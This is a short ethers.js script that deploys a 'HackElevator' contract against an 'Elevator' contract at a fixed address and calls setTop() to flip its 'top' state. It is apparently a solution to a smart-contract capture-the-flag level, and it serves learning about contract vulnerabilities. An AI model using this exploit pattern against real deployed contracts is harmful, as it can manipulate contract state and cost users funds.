const main = async () => {
  const elevatorFactory = await ethers.getContractFactory('Elevator');
  const elevator = await elevatorFactory.attach(
    '0x13f369CEb08D8a079EbDa35ab8f7b17a0dd704cb'
  );
  const hackFactory = await ethers.getContractFactory('HackElevator');
  const hack = await hackFactory.deploy(elevator.address);
  await hack.deployed();
  console.log('Deployed hack');
  var txn = await hack.setTop();
  await txn.wait();
  console.log('Set top done');
  txn = await elevator.top();
  console.log(txn);
};

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (e) {
    console.log(e);
    process.exit(1);
  }
};
runMain();
